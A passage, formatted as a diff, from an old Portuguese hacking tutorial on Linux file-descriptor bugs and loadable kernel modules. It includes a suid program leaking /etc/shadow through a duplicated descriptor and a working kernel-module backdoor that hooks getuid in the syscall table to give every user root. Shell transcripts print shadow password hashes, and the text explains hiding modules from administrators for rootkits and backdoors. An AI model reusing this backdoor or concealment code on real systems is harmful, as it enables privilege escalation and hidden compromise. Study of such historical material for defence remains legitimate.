+fd = open("/etc/shadow",0); /* Coloque outro se desejar */
+dup2(3,fd);
+execl("/bin/sh","sh",0);
+}
+---------------------------------------------------------------------------
+
+Note que o programa acima cria uma copia do file descriptor atraves de 
+dup2().Isso eh muito comum no uso de sockets em programas servidores.
+
++ Compile o programa acima e torne-o suid, depois como usuario normal,
+  execute os passos abaixo:
+
+$ ./fd_bug
+$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+$ cat <&3
+root:$1$/974tGAj$aEvr5RnMhOVGvYdCyIsGK0:11120:0:::::
+bin:*:9797:0:::::
+daemon:*:9797:0:::::
+adm:*:9797:0:::::
+lp:*:9797:0:::::
+sync:*:9797:0:::::
+shutdown:*:9797:0:::::
+halt:*:9797:0:::::
+mail:*:9797:0:::::
+news:*:9797:0:::::
+uucp:*:9797:0:::::
+operator:*:9797:0:::::
+games:*:9797:0:::::
+ftp:*:9797:0:::::
+gdm:*:9797:0:::::
+nobody:*:9797:0:::::
+nashleon:$1$0G0btFZ6$jyOft65daqEK3sXIJvG861:11120:0:99999:7::12201:
+martin:$1$bjAtFaa4$tmDLfVvZAoa71vwFA/.gt1:11120:0:99999:7::12201:
+
+O que aconteceu eh que ele criou uma copia do arquivo descriptor, ou seja,
+uma copia de /etc/shadow aberta em '3'.Esquemas como este tao simples 
+assim tambem eh dificil, mas se ligue na tecnica, e se por algum acaso
+voce chegar a ver por aih um dup2(), nao hesite em fucar atras de
+problemas com file descriptors.
+
+Os esquemas descritos nesta parte sao amplamente difundidos, sao basicos
+mas o conceito que envolve os mais eh bem agrangente, eu os especifiquei
+em Linux, mas sao mais expansivos.Programas Complexos com Milhares de
+Linhas de Codigos tendem a possuir uma probabilidade maior de possuir
+estes problemas, como cada caso eh um caso, caberah a voce ir mais fundo,
+buscando conhecer mais esquemas, mais tecnicas e mais conceitos, tem um
+ditado classico: "QUEM PROCURA ACHA!!" ; e no mundo do fucador isto eh
+mais do que um fato, vah fundo, busque obter o maximo de conhecimento,
+pesquise e voce encontrarah bugs e falhas em programas que ninguem nem se
+quer imaginava ser possivel!!
+
+----------------------------------
+5 - LKM (Loadable Kernel Modules) |
+----------------------------------
+
+Programacao ou escrita de LKMs eh uma poderosa ferramenta para um fucador.
+Sem sombra de duvida o poder que isto dah ao fucador eh consideravelmente
+grande.Veremos de forma basica, o que sao, para que servem e como escrever
+LKMs em sistema Linux.Dependendo da versao da kernel do seu linux, alguns
+programas e esquemas podem ser inviaveis ou terao que sofrer algumas
+modificacoes no codigo-fonte, um conhecimento medio em C se faz necessario. 
+Algumas rotinas requer um conhecimento basico de Assembly tambem, mas
+pretendo explicar essas rotinas detalhadamente para que voce possa
+entende-las plenamente sem necessitar recorrer a outros tutoriais, mas
+lembrando tambem que conhecimento nunca eh demais, se puder aprender tudo
+e mais um pouco de C e ASM, vah em frente.Peguei como base para este
+tutorial 2 textos muito importantes e excelentes: "(nearly) Complete Linux
+Loadable Kernel Modules" escrito por pragmatic/THC que pode ser obtido em
+http://www.infowar.co.uk/thc/ e "Weakening the Linux Kernel" escrito pelo
+plaguez que pode ser obtido na phrack de numero 52 item 18 em 
+http:www.phrack.com/, outro material interessante pode ser encontrado no
+livro "Linux Device Drivers", detalhes sobre ele, voce pode encontrar na
+parte Links e Referencias.Todos os esquemas e exemplos aqui sao descritos 
+para kernel 2.2.13, e como dito anteriormente, se sua kernel ou a kernel 
+alvo dos exemplos nao for essa, talvez os esquemas e exemplos nao funcionem 
+ou voce precisarah adaptar os programas.Aprendendo mesmo, voce estarah apto
+a construir suas proprias LKMs e seus proprios esquemas fucadores.Espero
+que esse item seja util para voce.
+
+5.1 - Para que Aprender a Escrever LKMs
+----------------------------------------
+
+LKMs refere-se a Loadable Kernel Modules(Modulos de Kernel Carregaveis).
+Sao modulos que sao carregados dinamicamente no kernel para executar
+determinadas tarefas.No Linux, os LKMs sao usados para expandir a
+funcionalidade da kernel.As vantagens em se usar LKMs sao varias, como
+vimos, podem ser abertas dinamicamente, isto eh, sem a recompilacao da
+kernel inteira, podem ser usadas para especificar devices drivers(ou
+filesystems) assim como soundcards, etc..Para um fucador, existem alguns
+esquemas que podem ser feitos com esses LKMs, e vao desde criacao de
+rootkits e backdoors, passando por sequestro de tty, e ateh mesmo a
+criacao de virus em sistemas Linux.
+
+5.2 - Carregando e Descarregando um LKM
+-----------------------------------------
+
+Antes de comecarmos com a programacao propriamente dita, devemos ver como
+se carrega e se descarrega um modulo no sistema.Para carregar, o modo mais
+simples eh descrito abaixo:
+
+[localhost]# insmod modulo.o
+
+OBS: Na grande maioria dos sistemas Linux(muito provavelmente todos!),
+     somente o root pode carregar e descarregar LKMs.
+
+Para descarregar, podemos fazer:
+
+[localhost]# rmmod modulo
+ou
+[localhost]# modprobe -r modulo
+
+Para vermos quais modulos estao carregados no nosso sistemas:
+
+[localhost]# lsmod
+
+ou
+
+[localhost]# cat /proc/modules
+
+Todos esses executaveis estao no diretorio "/sbin", e estes sao os modos
+mais simples, mas nao os unicos, de se carregar, visualizar e descarregar
+LKMs.
+
+5.3 - Duas Funcoes Minimas
+---------------------------
+
+Assim como em C nos temos uma funcao minima e obrigatoria, a funcao
+main(), em LKM, nos temos duas funcoes.Um funcao com acoes que sao
+executadas  quando o modulo eh carregado chamada "init_module()" e
+outra funcao com acoes que sao executadas quando o modulo eh descarregado
+chamada "cleanup_module()".Vejamos abaixo um simples programa exemplo
+para essas funcoes:
+
+-------------------------------lkm1.c-----------------------------------
+
+/* Simples Exemplo de LKM */
+
+#define     MODULE
+#define   __KERNEL__
+
+#include <linux/module.h>
+
+int init_module(void){
+printk("<1>Carregando Modulo...\n");
+printk("<1>\n");
+printk("<1>Seja bem vindo ao maravilhoso mundo dos LKMs!\n");
+printk("<0>Viaje nesse mundo com o Unsekurity Team!!\n");
+printk("<1>Modulo Carregado com Sucesso!!\n");
+return 0;
+}
+void cleanup_module(void)
+{
+printk("<1>Descarregando Modulo...\n");
+printk("<1>Modulo Descarregado com Sucesso!!\n");
+}
+------------------------------------------------------------------------
+
+Compile este programa da seguinte maneira:
+
+[localhost]# gcc -c -O3 lkm1.c
+
+Despois carregue-o no sistema usando insmod.Voce deve ver aparecer na tela
+as strings de init_module(), que corresponde as acoes que queremos que
+sejam executadas inicialmente.Depois voce pode descarrega-lo do sistema 
+usando modprobe ou rmmod.Verah aparecer as strings que estao em 
+cleanup_module().Deste modo, fica evidenciado o que representam estas duas 
+funcoes minimas.Sendo a segunda usada para sairmos limpamente
+(reinicializarmos o sistema) para o sistema.Note que no exemplo acima foi 
+usado printk ao invez de printf, pois lembre-se, estamos programando em LKMs, 
+muita coisa eh diferente do C padrao, mais abaixo voce poderah ver detalhes
+a respeito disso, o <0> e <1> significam a urgencia em que se deve imprimir
+o que se pede, ficando a cargo do sistema decidir sobre isso.
+
+Carregue novamente este LKM e em seguida digite lsmod, vamos analisar
+algumas coisas:
+
+Module                  Size  Used by
+lkm1			 460   0  (unused)
+
+
+O comando lsmod le as informacoes de /proc/modules para mostrar-nos os
+modulos que estao carregados no sistema.Agora veremos os campos:
+
+Module -> Eh o nome do nosso modulo carregado.
+
+Size -> Tamanho do modulo em bytes.
+
+Used by -> Este campo eh o que nos interessa, ele refere-se a uma especie
+	   de contador, pois ele nos diz quao frequentemente um modulo eh
+	   usado no sistema.O modulo soh pode ser removido quando este
+	   contador for igual a zero.Essa parte entre parenteses referem-se
+	   aos indicadores opcionais que sao strings de textos com mais
+	   informacoes sobre o LKM.
+
+
+Com essa informacao basica, vamos agora ver o que sao os systemcalls.
+
+5.4 - Systemcalls
+-----------------
+
+Todo Sistema Operacional tem algumas funcoes construidas sobre sua kernel,
+que sao usadas por toda operacao naquele sistema.As funcoes usadas pelo
+Linux sao chamadas de systemcalls.Elas representam a transicao do
+User-Space para o Kernel-Space.User-Space se refere a programacao C padrao
+comum em sistemas Linux, enquanto Kernel-Space se refere a programacao no
+espaco ou modo kernel, que eh o que estamos vendo, um modo diferente de
+programacao em relacao ao C padrao, e tambem, ambas se referem a parte da
+memoria ocupada por cada tipo desses de programacao(C e LKM).A abertura de
+um arquivo no User-Space eh representado pelo systemcall __NR_open no
+Kernel Space, logo, o systemcall sys_open ou __NR_open eh o responsavel
+pela transicao entre um Space e outro.Para uma completa lista de todos os
+systemcalls disponiveis em seu sistema, procure em
+/usr/include/sys/syscall.h.Aqui vem uma particularidade, como estamos em
+uma kernel 2.2.13(Slackware 7.0), o arquivo com os numeros das systemcalls
+eh um header dentro desse citado anteriormente, logo podemos consulta-lo em
+/usr/include/asm/unistd.h .A notacao que usarei no decorrer deste tutorial
+eh a descrita nesse arquivo, ou seja, para o systemcall sys_open, usarei
+__NR_open.Pois pretendo jah ir programando diretamente para kerneis mais
+atuais, com notacao "mais atual".Caso queira consultar no modo antigo,
+poderah analisar o seguinte arquivo: /usr/include/bits/syscall.h , nele
+estao os defines referentes aos systemcalls em versoes antigas da kernel.
+Se voce notar verah que a diferenca reside somente na troca de SYS por
+__NR.Veja o que eh melhor para voce.
+Vamos analisar agora parte de um arquivo /usr/include/asm/unistd.h:
+
+#ifndef _ASM_I386_UNISTD_H_
+#define _ASM_I386_UNISTD_H_
+
+/*
+ * This file contains the system call numbers.
+ */
+
+#define __NR_exit                 1
+#define __NR_fork                 2
+#define __NR_read                 3
+#define __NR_write                4
+#define __NR_open                 5
+#define __NR_close                6
+#define __NR_waitpid              7
+#define __NR_creat                8
+#define __NR_link                 9
+#define __NR_unlink              10
+#define __NR_execve              11
+#define __NR_chdir               12
+#define __NR_time                13
+#define __NR_mknod               14
+#define __NR_chmod               15
+#define __NR_lchown              16
+#define __NR_break               17
+#define __NR_oldstat             18
+#define __NR_lseek               19
+#define __NR_getpid              20
+#define __NR_mount               21
+#define __NR_umount              22
+#define __NR_setuid              23
+#define __NR_getuid              24
+#define __NR_stime               25
+#define __NR_ptrace              26
+#define __NR_alarm               27
+#define __NR_oldfstat            28
+#define __NR_pause               29
+#define __NR_utime               30
+...
+...
+#define __NR_capset             185
+#define __NR_sigaltstack        186
+#define __NR_sendfile           187
+#define __NR_getpmsg            188  /* some people actually want streams */
+#define __NR_putpmsg            189  /* some people actually want streams */
+#define __NR_vfork              190
+
+
+Se voce notar no seu arquivo, cada systemcall possui um numero
+correspondente.Na versao da minha kernel, 2.2.13, existem 190 systemcalls
+disponiveis.A kernel usa a interrupcao 0x80(sai para modo kernel) para
+gerenciar todo systemcall.O numero do systemcall e alguns argumentos sao
+movidos para alguns registradores(eax para o numero do systemcall, por
+exemplo).O numero do systemcall eh um index numa array de uma estrutura
+kernel, chamada sys_call_table[].Esta estrutura mapeia o numero do
+systemcall para o servico necessario da funcao,ou melhor dizendo, para 
+servir a necessidade de uma funcao.A seguinte tabela abaixo lista os mais 
+interessantes systemcalls com uma pequena descricao dos mesmos.Voce necessita 
+conhecer o trabalho ou funcionamento exato desses systemcalls em ordem para 
+fazer realmente LKMs eficientes.
+
+ ------------------------------------------------------------------------
+|            SYSTEMCALL              |		    DESCRICAO 		 |
+ ------------------------------------------------------------------------
+|int __NR_brk(unsigned long new_brk) | Muda o tamanho de um DS(Segmento  |
+|				     | de Dados) usado. 		 |
+ ------------------------------------------------------------------------
+|int __NR_getuid()	e            | Systemcalls para gerenciamento de |
+|int __NR_setuid (uid_t uid)	     | UID e etc.			 |
+ ------------------------------------------------------------------------
+|int __NR_fork(struct pt_regs regs); | System para a velha-conhecida     |
+|				     | funcao fork() no User-Space.      |
+ ------------------------------------------------------------------------
+| int __NR_get_kernel_sysms(struct   | systemcall para acessar a tabela  |
+|                kernel_sym *table)  | kernel system.			 |
+ ------------------------------------------------------------------------
+| int __NR_sethostname (char *name,  | Responsavel por setar o hostname. | 
+|			   int len); |					 |
+ ------------------------------------------------------------------------
+| int __NR_gethostname(char *name,   | Responsavel por pegar(capturar) o |
+|			  int len);  | hostname.			 |
+ ------------------------------------------------------------------------
+| int __NR_chdir (const char *path); | Ambas as funcoes sao responsaveis |
+| int __NR_fchdir (unsigned int fd); | por setar o diretorio atual(cd ..)|
+ ------------------------------------------------------------------------
+| int __NR_chmod (const char         | Funcoes de gerenciamento de       |
+|	   *filename, mode_t mode);  | permissoes(chmod,chown,fchmod     |
+| int __NR_chown (const char         | fchown).			         |
+|          *filename, mode_t mode);  |				         |
+| int __NR_fchmod (unsigned int      |					 |
+|              fildes, mode_t mode); |					 |
+| int __NR_fchown (unsigned int      |					 |
+|              fildes, mode_t mode); |					 |
+ ------------------------------------------------------------------------
+| int __NR_chroot (const char        | Seta diretorio root(chroot).      |
+|		       *filename)    | 					 |
+ ------------------------------------------------------------------------
+| int __NR_execve (struct pt_regs    | Chama um processo.Este eh um      | 
+|			     regs)   | systemcall importante, ele eh     |
+|				     | responsavel pela execucao de um   |
+|				     | arquivo (pt_regs eh o registrador |
+|				     | stack).				 |
+ ------------------------------------------------------------------------
+| long __NR_fcntl (unsigned int fd,  | Muda caracteristicas de um        |
+| unsigned int cmd, unsigned long    | arquivo(file descriptor) aberto.  |
+|                              arg); |					 |
+ ------------------------------------------------------------------------
+| int __NR_link  (const char         | Systemcalls para gerenciamento    |
+|    *oldname, const char *newname); | de hard/soft links.		 |
+| int __NR_un(const char *name);     | (linkar / deslinkar).	         |
+ ------------------------------------------------------------------------
+| int __NR_rename(const char 	     | Systemcall responsavel pela	 |
+|    *oldname, const char *newname); | renomeacao de um arquivo.	 |
+ ------------------------------------------------------------------------
+| int __NR_rmdir (const char* name); | Remove um diretorio.		 |
+ ------------------------------------------------------------------------
+| int __NR_mkdir (const *char        | Cria um diretorio.		 |
+|		filename, int mode); |					 |
+ ------------------------------------------------------------------------
+| int __NR_open (const char          | Tudo concernente a abrir arquivos |
+|              *filename, int mode); | (criacao tambem), e tambem        |
+| int __NR_close  (unsigned int fd); | fecha-los.			 |
+ ------------------------------------------------------------------------
+| long __NR_read (struct inode *,    | Systemcalls para escrever e ler   |
+|   struct file *, char *,u_long);   | em arquivos ou de arquivos.       |
+| long __NR_write(struct inode *,    |					 |
+|  struct file *,cons char *,u_long);|					 |
+ ------------------------------------------------------------------------
+| int __NR_getdents (unsigned int    | Systemcall que pega(captura)      |
+|        fd, struct dirent *dirent,  | lista de arquivos.		 |
+|               unsigned int count); | (ls ... comando)			 |
+ ------------------------------------------------------------------------
+| int __NR_readlink (const char      | Le um link simbolico.		 |
+|    *path, char *buf, int bufsize); |					 |
+ ------------------------------------------------------------------------
+| int __NR_select(int n, fd_set      | Bom e velho select.Multiplexacao  |
+|      *inp, fd_set *outp, fd_set    | de I/O(Entrada e Saida).          |
+|       *exp, struct timeval *tvp);  |					 |
+ ------------------------------------------------------------------------
+| int __NR_socketcall (int call,     | Funcoes socket.			 |
+|              unsigned long args);  |					 |
+ ------------------------------------------------------------------------
+| unsigned long __NR_create_module   | Carregar modulo.                  |
+|  (char *name, unsigned long size); |					 |
+ ------------------------------------------------------------------------
+| int __NR_delete_module             | Descarregar modulo.       	 |
+|                     (char *name);  |					 |
+ ------------------------------------------------------------------------
+| int __NR_query_module (const char  | Query(informar) sobre um modulo.  |
+|    *name, int which, void *buf,    |					 |
+|   size_t bufsize, size_t *ret);    |					 |
+ ------------------------------------------------------------------------
+| long long __NR_llseek (struct      | Equivalente a lseek no user space |
+|    inode *, struct file *,         |					 |
+|    long long, int);		     |					 |
+ ------------------------------------------------------------------------
+
+Para as intencoes de um hacker, estes sao os mais interessantes
+systemcalls.Caso voce venha a necessitar de algum systemcall especial,
+nao se apavore, voce pode trabalhar perfeitamente em cima desses descritos
+acima para implementar seu objetivo.
+
+
+5.5 - Kernel-Symbol-Table
+--------------------------
+
+Kernel-Symbol-Table ou Tabela de Simbolos do Kernel refere-se a uma tabela
+de simbolos usados pela kernel e que pode ser lida no arquivo /proc/ksyms.
+Para entendermos o conceito basico de systemcalls e modulos precisamos
+entender o que eh essa tabela.Voce pode dar uma olhada em seu arquivo
+/proc/ksyms( cat /proc/ksyms | more ), lah estarao listados todos os
+simbolos kernel(kernel-symbol) exportados(publicos),que pode ser acessado
+pelo nosso LKM.Todo simbolo usado por um LKM(como uma funcao) eh tambem
+exportado para o publico, e eh tambem listado naquele arquivo.Isso
+representa um problema, pois um administrador experiente pode descobrir
+nosso LKM e derruba-lo(killa-lo).Existem diversos metodos para previnir
+que o administrador da rede possa ver o nosso LKM, um possivel metodo
+segue explicado abaixo:
+
+A versao 2.2.13 da kernel, existe algumas diferencas em relacao as versoes
+antigas.Nela, uma macro jah vem definida para nao exportar simbolos.
+
+EXPORT_NO_SYMBOLS;
+
+Basta acrescentarmos ele no init_module( ou em alguma funcao que nao
+queiramos exportar simbolos.Esta macro eh equivalente a antiga 
+register_symtab(NULL);
+
+
+5.6 - Tranformando Memoria do Kernel Space p/ User Space
+----------------------------------------------------------
+
+Aqui comeca a parte interessante.Os systemcalls pegam seus argumentos do
+user space(systemcalls sao implementados em envoltorios como libc), mas
+nosso LKM roda no kernel space.Fazendo uma especie de 'transicao' eh 
+possivel acessarmos um argumento alocado no user space de nosso modulo
+kernel space.Tenha calma, mais abaixo isso tudo clareia!
+
+Olhe o seguinte systemcall:
+
+int sys_chdir (const char *path)
+
+Imagine que o sistema chama ele, e nos interceptamos este systemcall.
+Nos queremos checar o path que o usuario quer usar, entao nos temos que
+acessar const char *path.Se voce tentar acessar a variavel diretamente
+como:
+
+printk("<1>%s\n", path);
+
+voce irah ter problemas.Lembre-se que voce estah no kernel space, voce
+nao pode ler memoria do user space facilmente.Para a transicao de dado
+normal a seguinte funcao eh o modo mais facil de fazer:
+
+#include <asm/uacess.h>
+
+void copy_from_user(void *to, const void *from, unsigned long n);
+
+Vode poder usar a funcao acima para transicao de dados em geral.Com
+a funcao acima eh possivel convertermos dados da memoria do user space
+para a do kernel space.Mas e para o contrario(do kernel p/ o user)?
+Isto eh um pouco mais dificil porque nos nao podemos facilmente alocar
+memoria no user space da nossa posicao no kernel space.Se nos pudermos
+manusear este problema, nos poderemos usar:
+
+#include <asm/uacess.h>
+
+void copy_to_user(void *to, const void *from, unsigned long n);
+
+fazendo assim a atual conversao.Mas como alocar user space para o 
+ponteiro *to?? O plaguez na phrack nos deu a melhor solucao:
+
+/* Nos necessitamos breckar(parar) o systemcall */
+
+static inline _syscall1(int, brk, void *, end_data_segment);
+
+...
+
+int ret, tmp;
+char *truc = OLDEXEC; /* Executavel normal que seria executado */
+char *nouveau = NEWEXEC; /* Executavel que serah executado */
+unsigned long mmm;
+
+mmm = current->mm->brk;
+ret = brk((void *) (mmm + 256));
+if (ret < 0)
+   return ret;
+copy_to_user((void *) (mmm + 2), nouveau, strlen(nouveau) + 1);
+
+...
+
+Voce pode perceber acima que nouveau se refere ao executavel que serah
+executado, assumindo assim a memoria do user space. current eh um ponteiro
+para a struct(estrutura) da aplicacao atual(a que estah sendo executada); 
+mm eh eh o ponteiro para mm_struct - responsavel pelo gerenciamento de
+memoria daquele processo.Usando o systemcall brk em current-> mm->brk,
+nos estamos habilitados a incrementar o tamanho da area nao utilizada do
+datasegment(segmento de dados).E como nos todos sabemos que alocacao de
+memoria eh feita jogando(manipulando dados) com o datasegment, entao nos
+incrementamos(aumentamos) o tamanho da area nao usada, temos que alocar 
+algumas partes da memoria para o processo atual.Esta memoria pode ser
+usada para copiar a memoria do kernel space para o user space(processo
+atual).Voce deve estar intrigado sobre a primeira linha do codigo acima:
+
+static inline _syscall1(int, brk, void *, end_data_segment);
+
+Esta linha ajuda-nos a usar o user space como funcoes no kernel space.Toda
+funcao do user space provida para nos(como fork, brk, open, read, write,..)
+eh representada por um macro _syscall(...).Entao nos podemos construir o
+systcall-macro para uma certa funcao user space(representada por um
+systemcall); no exemplo acima foi usada brk.
+
+
+5.7 - Meios de Usar User Space como Funcoes
+--------------------------------------------
+
+Como foi visto no item anterior , nos usamos um syscall-macro para
+construir nossa propria chamada brk, que eh parecida com a que conhecemos
+no user space(brk(2)).O codigo abaixo mostra o macro responsavel pela
+construcao da funcao brk:
+
+#define _syscall1(type,name,type1,arg1) \
+type name(type1 arg1) \
+{ \
+long __res; \
+__asm__ volatile ("int $0x80" \
+        : "=a" (__res) \
+        : "0" (__NR_##name),"b" ((long)(arg1))); \
+__syscall_return(type,__res); \
+}
+
+Esse codigo eh um pedaco do arquivo "/usr/include/asm/unistd.h".Nao
+precisamos entender o completo funcionamento deste codigo, ele somente
+chama a interrupcao 0x80 com alguns argumentos providos pelo parametro
+_syscall1.O argumento name consiste do systemcall que nos necessitamos
+(o name eh expandido para __NR_name, que eh definido em asm/unistd.h).
+Foi por este modo que nos implementamos a funcao brk.Qualquer outra funcao
+com muitos argumentos sao implementadas sobre outros macros(_syscallX, onde
+X se refere ao numero de argumentos.No exemplo com brk(2), como brk possui
+somente 1 argumento, o macro eh _syscall1.
+
+Um outro modo de implementar funcoes pode ser visto abaixo:
+
+int (*open)(char *, int, int); /* declara o prototipo da funcao. */
+
+open = sys_call_table[__NR_open];  /* manda o prototipo apontar para
+				       o systemcall. */
+
+Neste modo acima, nos nao precisamos usar qualquer macro systemcall, nos
+somente fizemos o ponteiro para a funcao apontar para a tabela sys_call.
+
+Um outro modo para implementar isto eh manipular os registradores
+necessarios.Voce deve saber que o Linux usa seletores de segmento para
+diferenciar entre kernel space e user space.Argumentos usados com
+systemcalls que foram editados no User-Space estao em algum lugar na 
+seletor da fila de segmento de dados(DS), esse modo nao eh muito usado,
+por isso, nao pretendo disponibilizar ele neste tutorial, mas de uma 
+olhada no Tutorial da The Hackers Choice para obter mais infos sobre
+isso.
+
+Com o que vimos ateh aqui jah podemos fazer um exemplo.Vejamos o simples
+programa abaixo:
+
+---------------------------- todos_root.c -----------------------------
+/* Exemplo de LKM que torna todo mundo com UID, GID e EUID iguais a 0.
+   Desenvolvida por Nash Leon para tutorial de LKM. */
+
+/* Abaixo seguem os defines e includes necessarios */
+
+#define     MODULE
+#define   __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/stat.h>
+#include <linux/mm.h>
+#include <linux/if.h>
+#include <sys/syscall.h>
+#include <asm/unistd.h>
+
+/* Chamada para a tabela de system calls */
+
+extern void *sys_call_table[] ;
+
+
+/* Funcao que serah usada p/ "salvar" a configuracao antiga do
+   usuario, assim como open acima, ela irah ser apontada para o 
+   systemcall que desejamos */
+
+int (*original_getuid)(); 
+
+/* Nossa funcao backdoor para __NR_getuid */
+
+int back_get(){
+
+/* Compara uid atual, se for diferente de zero, ele irah transformar
+   as configuracoes que desejamos.Lembre-se que current se refere ao
+   processo atual, como vimos anteriormente */
+
+if (current->uid != 0) {
+current->uid = 0;
+current->gid = 0;
+current->euid = 0;
+			}
+        return 0;
+}
+
+int init_module(void){
+original_getuid = sys_call_table[__NR_getuid];
+sys_call_table[__NR_getuid] = back_get;
+printk("<1>Backdoor Instalada com Sucesso!!!\n");
+return 0;
+}
+
+int cleanup_module(void){
+sys_call_table[__NR_getuid] = original_getuid;
+printk("<1>Modulo Descarregado!\n");
+return 0;
+}
+
+------------------------------------------------------------------------
+
+Abaixo seguem os passos na shell:
+
+* Como root:
+
+[localhost]# gcc -c -O3 todos_root.c
+[localhost]# insmod todos_root.o
+Backdoor Instalada com Sucesso!!!
+
+* Como usuario normal:
+
+[localhost]$ id
+uid=0(root) gid=0(root) euid=1000(nashleon) egid=100(users) groups=100(users)
+[localhost]$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+[localhost]$ /bin/sh
+[localhost]# cat /etc/shadow
+root:$1$/974tGAj$aEvr5RnMhOVGvYdCyIsGK0:11120:0:::::
+bin:*:9797:0:::::
+daemon:*:9797:0:::::
+adm:*:9797:0:::::
+lp:*:9797:0:::::
+sync:*:9797:0:::::
+shutdown:*:9797:0:::::
+halt:*:9797:0:::::
+mail:*:9797:0:::::
+news:*:9797:0:::::
+uucp:*:9797:0:::::
+operator:*:9797:0:::::
+games:*:9797:0:::::
+ftp:*:9797:0:::::
+gdm:*:9797:0:::::
+nobody:*:9797:0:::::
+nashleon:$1$0G0btFZ6$jyOft65daqEK3sXIJvG861:11120:0:99999:7::12201:
+martin:$1$bjAtFaa4$tmDLfVvZAoa71vwFA/.gt1:11120:0:99999:7::12201:
+
+Podemos ver que funciona perfeitamente.Mas nesse exemplo todos viraram
+root, e isso pode nao ser nada bom, mas vamos com calma.Jah estah
+conseguindo contemplar os possiveis esquemas??:)
+
+5.8 - Lista de Funcoes usadas em Kernel Space
+-----------------------------------------------
+
+No inicio deste tutorial, nos vimos a funcao printk, que eh usada somente
+no kernel space.A Tabela abaixo mostra as principais funcoes usadas pelo
+kernel space:
+
++------------------------------------------------------------------------+
+|		FUNCAO	            |             DESCRICAO		 |
++------------------------------------------------------------------------+
+| int sprintf (char *buf, const     | Funcoes para 'enpacotamento' de    |
+|                 char *fmt, ...);  | strings.				 |
+| int vsprintf (char *buf, const    |					 |
+|        char *fmt, va_list args);  |					 |
++------------------------------------------------------------------------+
+|  printk (...) 		    | Semelhante a printf no user space  |
++------------------------------------------------------------------------+
+| void *memset (void *s, char c,    | Funcoes de manipulacao de 	 |
+|		    size_t count);  | 'memoria'			         |
+| void *memcpy (void *dest, const   |				         |
+|        void *src, size_t count);  |					 |	
+| char *bcopy (const char *src,     |					 |
+|          char *dest, int count);  |					 |
+| void *memmove (void *dest, const  |					 |
+|        void *src, size_t count);  |					 |
+| int memcmp (const void *cs, const |					 |
+|         void *ct, size_t count);  |					 |
+| void *memscan (void *addr,        |					 |
+|    unsigned char c, size_t size); |					 |
++------------------------------------------------------------------------+
+| char *strcpy (char *dest, const   | Semelhantes a strcpy e strncpy     |
+|                       char *src); | no user space, respectivamente     |
+| char *strncpy (char *dest, const  |					 |
+|         char *src, size_t count); |					 |
++------------------------------------------------------------------------+
+| char *strcat (char *dest, const   | Semelhantes, respectivamente, a    |
+|                       char *src); | strcat e strncat no user space     |
+| char *strncat (char *dest, const  |					 |
+|         char *src, size_t count); |					 |
++------------------------------------------------------------------------+
+| int strcmp (const char *cs,       | Funcoes de comparacao de strings.  |
+|                  const char *ct); | Semelhantes a strcmp e strncmp do  |
+| int strncmp (const char *cs,const | user space			 |
+|          char *ct, size_t count); |					 |
++------------------------------------------------------------------------+
+| char *strchr (const char *s,      | Retorna um ponteiro para primeira  |
+|			   char c); | ocorrencia do char c na string     |
+|				    | s.Semelhante strchr no user space  |
++------------------------------------------------------------------------+
+| size_t strlen (const char *s);    | Semelhantes a strlen e strnlen,    |
+| size_t strnlen (const char *s,    | respectivamente, no user space     |
+|		  size_t count);    |					 |
++------------------------------------------------------------------------+
+| size_t strspn (const char *s,     | Funcoes usadas para procurar uma   |
+|           const char *accept);    | string de/para um set de caracters.|
+| char *strpbrk (const char *cs,    | Semelhantes a strspn e strpbrk no  |
+|               const char *ct);    | user space			 |
++------------------------------------------------------------------------+
+| char *strtok (char *s, const      | Semelhante a strtok no user space  |
+|                     char *ct);    |					 |
++------------------------------------------------------------------------+
+| unsigned long simple_strtoul      | Usada para converter strings em    |
+|   (const char *cp, char **endp,   | numeros				 |
+|            unsigned int base);    |					 |
++------------------------------------------------------------------------+
+| get_user_byte (addr);             | Funcoes para acessar a memoria do  |
+| put_user_byte (var, addr);        | usuario				 |
+| get_user_word (addr);		    |					 |
+| put_user_word (var, addr);        |					 |
+| get_user_long (addr);             |					 |
+| put_user_long (var, addr);        |					 |
++------------------------------------------------------------------------+
+| suser()			    | Checa por direitor de Super        |
+| fsuser()			    | usuario				 |
++------------------------------------------------------------------------+
+|int register_chrdev(unsigned int   | Funcoes que registram device       |
+|  major, const char *name, struct  | drivers.Sendo que:		 |
+|          file_o perations *fops); | ..._chrdev -> Se refere a devices  |
+|int unregister_chrdev (unsigned    |		    do tipo char.        |
+|     int major, const char *name); | ..._blkdev -> Se refere a devices  |
+|int register_blkdev (unsigned int  |		    do tipo block.       |
+|   major, const char *name, struct |					 |
+|          file_o perations *fops); |					 |
+|int unregister_blkdev (unsigned    |					 |
+|     int major, const char *name); |					 |
++------------------------------------------------------------------------+
+| int acess_ok(int type, unsigned   | Esta funcao retorna verdadeiro(1)  |
+|     long addr, unsigned long      | se o processo atual puder acessar  |
+|                           size);  | a memoria no endereco addr, caso   |
+|				    | contrario, retorna falso(0).       |
++------------------------------------------------------------------------+
+
+Existem muitas outras funcoes que podem ser usadas perfeitamente, foge ao
+objetivo deste tutorial citar todas, para o intuito de um fucador, basta
+essas. Lembre-se sempre que devemos dominar o 'baixo nivel' se virando com
+o que temos nas maos.
+
+5.9. -  O que eh o Kernel Daemon
+---------------------------------
+
+Explicarei abaixo o conceito de Kernel Daemon em sistemas 2.0.X para que
+voce possa entender alguns conceitos somente:
+
+O Daemon Kernel(/sbin/kerneld) estah presente em todas as distribuicoes do
+Linux.Como o proprio nome sugere, este eh um processo no user space
+esperando por alguma acao.Primeiro de tudo, voce deve saber que eh necessario
+ativar a opcao kerneld enquanto constroi o kernel em ordem para usar
+caracteristicas da kernel.Kerneld trabalha do seguinte modo: Se o kernel
+quer acessar um recurso(no kernel space, logico), que nao estah presente
+naquele momento, ele nao produz um erro, ao inves disso, ele pergunta ao
+kerneld por aquele recurso.Se kerneld estah habilitado para prover o recurso,
+ele carrega o LKM requerido e o kernel pode continuar trabalhando.Pelo uso
+deste esquema eh possivel carregar LKMs somente quando elas sao realmente 
+necessarias, descarregando-as quando nao ha necessidade do uso das mesmas.
+O kernel deve estar ciente que este trabalho necessita ser terminado em
+ambos os espacoes(user e kernel).Kerneld existe no user space.Se o kernel
+requisita um novo modulo, este daemon recebe uma string do kernel dizendo
+a ele qual modo deve ser carregado.Eh possivel que o kernel envie um nome
+generico (ao inves do nome do arquivo objeto) como eth0.Neste caso o 
+sistema precisa procurar /etc/modules.conf por linhas de alias.Essas
